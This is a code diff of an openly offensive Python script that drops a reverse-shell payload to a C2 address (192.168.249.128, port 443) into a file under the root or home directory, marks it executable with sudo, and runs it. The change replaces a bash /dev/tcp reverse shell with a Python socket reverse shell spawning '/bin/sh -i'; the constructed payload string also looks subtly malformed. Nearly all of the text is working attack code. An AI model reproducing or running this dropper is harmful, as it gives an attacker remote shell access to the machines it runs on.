@@ -24,30 +24,25 @@ USER = getpass.getuser()
 TIME = int(time.time())
 C2 = "192.168.249.128"
 PORT = 443
+PAYLOAD = "python -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+C2.strip('"')+",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"/bin/sh -i\")'"
 
 
 def touch_file():
     try:
         with open(ROOT_PATH, 'a') as root_fd:
-            message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
-                C2.strip('"'),
-                PORT
-            )
+            message = PAYLOAD
             print(message)
             root_fd.write(message + '\n')
             os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
-            subprocess.call(["/bin/sh -c ."+os.path.join(os.path.abspath(os.sep), FILENAME)])
+            subprocess.call(["."+os.path.join(os.path.abspath(os.sep), FILENAME)])
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
-                message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
-                    C2.strip('"'),
-                    PORT
-                )
+                message = PAYLOAD
                 print(message)
                 user_fd.write(message + '\n')
                 os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
-                subprocess.call(["/bin/sh -c ."+os.path.join(os.path.expanduser('~'), FILENAME)])
+                subprocess.call(["."+os.path.join(os.path.expanduser('~'), FILENAME)])
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
             print('What kind of tricky system are you running this on?')
